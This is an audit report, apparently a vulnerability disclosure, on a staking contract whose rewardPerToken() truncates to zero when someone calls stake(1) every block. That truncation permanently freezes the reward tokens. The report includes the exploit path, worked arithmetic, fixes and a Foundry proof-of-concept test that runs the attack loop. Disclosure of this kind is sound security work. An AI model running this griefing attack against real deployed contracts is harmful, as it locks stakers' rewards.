Audit Report

## Title
Reward Accumulation Permanently Frozen via Integer Truncation in `rewardPerToken()` When `dt` Is Kept Small - (File: `contracts/KERNEL/KernelDepositPool.sol`)

## Summary

`KernelDepositPool.rewardPerToken()` computes the per-token reward increment as `rewardRate * dt * DECIMAL_PRECISION / totalKernelStaked`. The `updateReward` modifier resets `updatedAt` to `lastTimeRewardApplicable()` on every invocation. An unprivileged attacker who calls `stake(1)` every block keeps `dt` pinned to ~12 seconds, causing Solidity integer division to truncate the increment to zero. `rewardPerTokenStored` never advances, all stakers earn zero rewards for the entire distribution window, and the deposited reward tokens are permanently locked with no recovery path.

## Finding Description

`rewardPerToken()` accumulates the global reward index:

```solidity
// contracts/KERNEL/KernelDepositPool.sol L408-414
return rewardPerTokenStored + (rewardRate * (lastTimeRewardApplicable() - updatedAt) * DECIMAL_PRECISION)
    / totalKernelStaked;
```

The `updateReward` modifier, applied to every state-changing function including the public `stake(uint256)`, resets the clock before executing the function body:

```solidity
// contracts/KERNEL/KernelDepositPool.sol L232-242
modifier updateReward(address _account) {
    rewardPerTokenStored = rewardPerToken();
    updatedAt = lastTimeRewardApplicable(); // resets dt to 0 on every call
    ...
}
```

`rewardRate` is set by integer division in `notifyRewardAmount`:

```solidity
// contracts/KERNEL/KernelDepositPool.sol L579-584
rewardRate = receivedAmount / duration;
```

`stake()` has no minimum amount guard beyond `_amount == 0`:

```solidity
// contracts/KERNEL/KernelDepositPool.sol L281-282
function stake(uint256 _amount) external nonReentrant updateReward(msg.sender) {
    if (_amount == 0) revert AmountZero();
```

**Exploit path:**

1. Admin calls `notifyRewardAmount(40_000e6)` with USDC (6 decimals), `duration = 604800`.  
   → `rewardRate = 40_000e6 / 604800 = 66_137`
2. `totalKernelStaked = 1_000_000e18` (1e24 wei).
3. Attacker calls `stake(1)` every Ethereum block (~12 s).

Each iteration:
```
dt = 12
increment = 66_137 * 12 * 1e18 / 1e24
           = 793_644e18 / 1e24
           = 793_644 / 1_000_000
           = 0  (integer truncation)
rewardPerTokenStored += 0
updatedAt = block.timestamp  // clock reset
```

After the full 604,800-second window, `rewardPerTokenStored` remains 0. `earned()` returns 0 for every staker. `getReward()` transfers nothing. The 40,000 USDC is permanently locked because there is no sweep or token-recovery function, and the next `notifyRewardAmount` call uses `rewardRate` (not the actual token balance), so the frozen tokens are never redistributed.

## Impact Explanation

**Medium — Permanent freezing of unclaimed yield.**

`rewardPerTokenStored` never increases → `earned()` always returns 0 → `getReward()` transfers nothing to any staker. The reward tokens deposited via `notifyRewardAmount` are permanently frozen in the contract. This exactly matches the allowed impact: *"Medium. Permanent freezing of unclaimed yield."*

## Likelihood Explanation

The attack is reachable by any unprivileged address via the public `stake(uint256)` function with `_amount = 1`. No special role is required. The attacker needs only a negligible amount of KERNEL tokens (~50,400 wei for a 7-day window). Gas cost is the primary deterrent, but a validator/block proposer pays no gas. The truncation condition is realistic whenever the reward token has low decimals (USDC, USDT) and the staked supply is large — a common operational configuration.

## Recommendation

1. **Higher precision at storage time**: Store `rewardRate` scaled by `DECIMAL_PRECISION` (i.e., `rewardRate * 1e18`) and divide only at read time, eliminating per-second truncation.
2. **Accumulate remainder dust**: Track the fractional reward truncated each call and add it back to the next period's `rewardRate` calculation, as Synthetix does in `notifyRewardAmount`.
3. **Minimum `dt` guard**: Skip the `rewardPerTokenStored` update if `dt` is below a meaningful threshold (e.g., 1 hour), preventing sub-threshold calls from resetting `updatedAt` without contributing reward.
4. **Token recovery function**: Add an admin-callable sweep so that any stranded reward balance can be recovered and redistributed.

## Proof of Concept

**Foundry fork/unit test plan:**

```solidity
function test_rewardFrozenBySmallDt() public {
    // Setup
    uint256 duration = 604_800;
    uint256 rewardAmount = 40_000e6; // USDC
    uint256 stakeAmount = 1_000_000e18; // 1M KERNEL

    // Admin sets duration, legitimate staker stakes
    vm.prank(admin); pool.setDuration(duration);
    deal(address(kernelToken), alice, stakeAmount);
    vm.prank(alice); kernelToken.approve(address(pool), stakeAmount);
    vm.prank(alice); pool.stake(stakeAmount);

    // Admin notifies reward
    deal(address(usdc), admin, rewardAmount);
    vm.prank(admin); usdc.approve(address(pool), rewardAmount);
    vm.prank(admin); pool.notifyRewardAmount(rewardAmount);

    // Attacker stakes 1 wei every 12 seconds for the full duration
    deal(address(kernelToken), attacker, duration); // ~50400 wei
    vm.prank(attacker); kernelToken.approve(address(pool), type(uint256).max);
    for (uint256 i = 0; i < duration / 12; i++) {
        vm.warp(block.timestamp + 12);
        vm.prank(attacker); pool.stake(1);
    }

    // Assert: rewardPerTokenStored is still 0
    assertEq(pool.rewardPerTokenStored(), 0);

    // Assert: alice earns nothing
    assertEq(pool.earned(alice), 0);

    // Assert: USDC is locked in contract
    assertEq(usdc.balanceOf(address(pool)), rewardAmount);
}
```
